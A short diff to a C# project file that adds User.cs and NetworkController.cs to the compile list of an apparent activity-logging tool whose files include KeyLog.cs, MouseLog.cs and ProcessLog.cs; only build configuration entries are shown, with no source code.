@@ -46,7 +46,9 @@
   <ItemGroup>
     <Compile Include="KeyLog.cs" />
     <Compile Include="MLogger.cs" />
+    <Compile Include="model\User.cs" />
     <Compile Include="MouseLog.cs" />
+    <Compile Include="NetworkController.cs" />
     <Compile Include="ProcessLog.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -56,5 +58,6 @@
   <ItemGroup>
     <None Include="App.config" />
   </ItemGroup>
+  <ItemGroup />
   <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
 </Project>
